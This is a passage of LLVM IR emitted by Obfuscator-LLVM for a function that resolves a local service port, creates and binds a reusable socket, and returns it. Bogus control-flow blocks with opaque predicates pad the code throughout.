  %19 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %12, i32 0, i32 1
  store i32 0, i32* %19, align 4
  %20 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %12, i32 0, i32 2
  store i32 1, i32* %20, align 8
  %21 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %12, i32 0, i32 0
  store i32 1, i32* %21, align 8
  %22 = load i8*, i8** %11, align 8
  %23 = call i32 @getaddrinfo(i8* null, i8* %22, %struct.addrinfo* %12, %struct.addrinfo** %13)
  store i32 %23, i32* %15, align 4
  %24 = load i32, i32* %15, align 4
  %25 = icmp ne i32 %24, 0
  %26 = load i32, i32* @x.29
  %27 = load i32, i32* @y.30
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %25, label %34, label %55

; <label>:34:                                     ; preds = %originalBBpart2
  %35 = load i32, i32* @x.29
  %36 = load i32, i32* @y.30
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %34
  %43 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %44 = load i32, i32* %15, align 4
  %45 = call i8* @gai_strerror(i32 %44) #7
  %46 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %43, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.109, i32 0, i32 0), i8* %45)
  store i32 -1, i32* %10, align 4
  %47 = load i32, i32* @x.29
  %48 = load i32, i32* @y.30
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %220

; <label>:55:                                     ; preds = %originalBBpart2
  %56 = load i32, i32* @x.29
  %57 = load i32, i32* @y.30
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %55
  %64 = load %struct.addrinfo*, %struct.addrinfo** %13, align 8
  store %struct.addrinfo* %64, %struct.addrinfo** %14, align 8
  %65 = load i32, i32* @x.29
  %66 = load i32, i32* @y.30
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %73

; <label>:73:                                     ; preds = %originalBBpart228, %originalBBpart28
  %74 = load %struct.addrinfo*, %struct.addrinfo** %14, align 8
  %75 = icmp ne %struct.addrinfo* %74, null
  br i1 %75, label %76, label %195

; <label>:76:                                     ; preds = %73
  %77 = load %struct.addrinfo*, %struct.addrinfo** %14, align 8
  %78 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %77, i32 0, i32 1
  %79 = load i32, i32* %78, align 4
  %80 = load %struct.addrinfo*, %struct.addrinfo** %14, align 8
  %81 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %80, i32 0, i32 2
  %82 = load i32, i32* %81, align 8
  %83 = load %struct.addrinfo*, %struct.addrinfo** %14, align 8
  %84 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %83, i32 0, i32 3
  %85 = load i32, i32* %84, align 4
  %86 = call i32 @socket(i32 %79, i32 %82, i32 %85) #7
  store i32 %86, i32* %16, align 4
  %87 = load i32, i32* %16, align 4
  %88 = icmp eq i32 %87, -1
  br i1 %88, label %89, label %90

; <label>:89:                                     ; preds = %76
  br label %175

; <label>:90:                                     ; preds = %76
  %91 = load i32, i32* @x.29
  %92 = load i32, i32* @y.30
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %90
  store i32 1, i32* %17, align 4
  %99 = load i32, i32* %16, align 4
  %100 = bitcast i32* %17 to i8*
  %101 = call i32 @setsockopt(i32 %99, i32 1, i32 2, i8* %100, i32 4) #7
  %102 = icmp eq i32 %101, -1
  %103 = load i32, i32* @x.29
  %104 = load i32, i32* @y.30
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %102, label %111, label %128

; <label>:111:                                    ; preds = %originalBBpart212
  %112 = load i32, i32* @x.29
  %113 = load i32, i32* @y.30
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %111
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.110, i32 0, i32 0))
  %120 = load i32, i32* @x.29
  %121 = load i32, i32* @y.30
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %128

; <label>:128:                                    ; preds = %originalBBpart216, %originalBBpart212
  %129 = load i32, i32* %16, align 4
  %130 = load %struct.addrinfo*, %struct.addrinfo** %14, align 8
  %131 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %130, i32 0, i32 5
  %132 = load %struct.sockaddr*, %struct.sockaddr** %131, align 8
  %133 = load %struct.addrinfo*, %struct.addrinfo** %14, align 8
  %134 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %133, i32 0, i32 4
  %135 = load i32, i32* %134, align 8
  %136 = call i32 @bind(i32 %129, %struct.sockaddr* %132, i32 %135) #7
  store i32 %136, i32* %15, align 4
  %137 = load i32, i32* %15, align 4
  %138 = icmp eq i32 %137, 0
  br i1 %138, label %139, label %156

; <label>:139:                                    ; preds = %128
  %140 = load i32, i32* @x.29
  %141 = load i32, i32* @y.30
  %142 = sub i32 %140, 1
  %143 = mul i32 %140, %142
  %144 = urem i32 %143, 2
  %145 = icmp eq i32 %144, 0
  %146 = icmp slt i32 %141, 10
  %147 = or i1 %145, %146
  br i1 %147, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %139
  %148 = load i32, i32* @x.29
  %149 = load i32, i32* @y.30
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %195

; <label>:156:                                    ; preds = %128
  %157 = load i32, i32* @x.29
  %158 = load i32, i32* @y.30
  %159 = sub i32 %157, 1
  %160 = mul i32 %157, %159
  %161 = urem i32 %160, 2
  %162 = icmp eq i32 %161, 0
  %163 = icmp slt i32 %158, 10
  %164 = or i1 %162, %163
  br i1 %164, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %156
  %165 = load i32, i32* %16, align 4
  %166 = call i32 @close(i32 %165)
  %167 = load i32, i32* @x.29
  %168 = load i32, i32* @y.30
  %169 = sub i32 %167, 1
  %170 = mul i32 %167, %169
  %171 = urem i32 %170, 2
  %172 = icmp eq i32 %171, 0
  %173 = icmp slt i32 %168, 10
  %174 = or i1 %172, %173
  br i1 %174, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %175

; <label>:175:                                    ; preds = %originalBBpart224, %89
  %176 = load i32, i32* @x.29
  %177 = load i32, i32* @y.30
  %178 = sub i32 %176, 1
  %179 = mul i32 %176, %178
  %180 = urem i32 %179, 2
  %181 = icmp eq i32 %180, 0
  %182 = icmp slt i32 %177, 10
  %183 = or i1 %181, %182
  br i1 %183, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %175
  %184 = load %struct.addrinfo*, %struct.addrinfo** %14, align 8
  %185 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %184, i32 0, i32 7
  %186 = load %struct.addrinfo*, %struct.addrinfo** %185, align 8
  store %struct.addrinfo* %186, %struct.addrinfo** %14, align 8
  %187 = load i32, i32* @x.29
  %188 = load i32, i32* @y.30
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %73

; <label>:195:                                    ; preds = %originalBBpart220, %73
  %196 = load i32, i32* @x.29
  %197 = load i32, i32* @y.30
  %198 = sub i32 %196, 1
  %199 = mul i32 %196, %198
  %200 = urem i32 %199, 2
  %201 = icmp eq i32 %200, 0
  %202 = icmp slt i32 %197, 10
  %203 = or i1 %201, %202
  br i1 %203, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %195
  %204 = load %struct.addrinfo*, %struct.addrinfo** %14, align 8
  %205 = icmp eq %struct.addrinfo* %204, null
  %206 = load i32, i32* @x.29
  %207 = load i32, i32* @y.30
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %205, label %214, label %217

; <label>:214:                                    ; preds = %originalBBpart232
  %215 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %216 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %215, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.111, i32 0, i32 0))
  store i32 -1, i32* %10, align 4
  br label %220

; <label>:217:                                    ; preds = %originalBBpart232
  %218 = load %struct.addrinfo*, %struct.addrinfo** %13, align 8
  call void @freeaddrinfo(%struct.addrinfo* %218) #7
  %219 = load i32, i32* %16, align 4
  store i32 %219, i32* %10, align 4
  br label %220

; <label>:220:                                    ; preds = %217, %214, %originalBBpart24
  %221 = load i32, i32* @x.29
  %222 = load i32, i32* @y.30
  %223 = sub i32 %221, 1
  %224 = mul i32 %221, %223
  %225 = urem i32 %224, 2
  %226 = icmp eq i32 %225, 0
  %227 = icmp slt i32 %222, 10
  %228 = or i1 %226, %227
  br i1 %228, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %220
  %229 = load i32, i32* %10, align 4
  %230 = load i32, i32* @x.29
  %231 = load i32, i32* @y.30
  %232 = sub i32 %230, 1
  %233 = mul i32 %230, %232
  %234 = urem i32 %233, 2
  %235 = icmp eq i32 %234, 0
  %236 = icmp slt i32 %231, 10
  %237 = or i1 %235, %236
  br i1 %237, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  ret i32 %229

originalBBalteredBB:                              ; preds = %originalBB, %1
  %238 = alloca i32, align 4
  %239 = alloca i8*, align 8
  %240 = alloca %struct.addrinfo, align 8
  %241 = alloca %struct.addrinfo*, align 8
  %242 = alloca %struct.addrinfo*, align 8
  %243 = alloca i32, align 4
  %244 = alloca i32, align 4
  %245 = alloca i32, align 4
  store i8* %0, i8** %239, align 8
  %246 = bitcast %struct.addrinfo* %240 to i8*
  call void @llvm.memset.p0i8.i64(i8* %246, i8 0, i64 48, i32 8, i1 false)
  %247 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %240, i32 0, i32 1
  store i32 0, i32* %247, align 4
  %248 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %240, i32 0, i32 2
  store i32 1, i32* %248, align 8
  %249 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %240, i32 0, i32 0
  store i32 1, i32* %249, align 8
  %250 = load i8*, i8** %239, align 8
  %251 = call i32 @getaddrinfo(i8* null, i8* %250, %struct.addrinfo* %240, %struct.addrinfo** %241)
  store i32 %251, i32* %243, align 4
  %252 = load i32, i32* %243, align 4
  %253 = icmp ne i32 %252, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %34
  %254 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %255 = load i32, i32* %15, align 4
  %256 = call i8* @gai_strerror(i32 %255) #7
  %257 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %254, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.109, i32 0, i32 0), i8* %256)
  store i32 -1, i32* %10, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %55
  %258 = load %struct.addrinfo*, %struct.addrinfo** %13, align 8
  store %struct.addrinfo* %258, %struct.addrinfo** %14, align 8
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %90
  store i32 1, i32* %17, align 4
  %259 = load i32, i32* %16, align 4
  %260 = bitcast i32* %17 to i8*
  %261 = call i32 @setsockopt(i32 %259, i32 1, i32 2, i8* %260, i32 4) #7
  %262 = icmp eq i32 %261, -1
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %111
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.110, i32 0, i32 0))
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %139
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %156
  %263 = load i32, i32* %16, align 4
  %264 = call i32 @close(i32 %263)
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %175
  %265 = load %struct.addrinfo*, %struct.addrinfo** %14, align 8
  %266 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %265, i32 0, i32 7
  %267 = load %struct.addrinfo*, %struct.addrinfo** %266, align 8
  store %struct.addrinfo* %267, %struct.addrinfo** %14, align 8
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %195
  %268 = load %struct.addrinfo*, %struct.addrinfo** %14, align 8
  %269 = icmp eq %struct.addrinfo* %268, null
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %220
  %270 = load i32, i32* %10, align 4
  br label %originalBB34
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #4

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #7

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #4

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { nounwind readonly }
attributes #9 = { nounwind readnone }
attributes #10 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
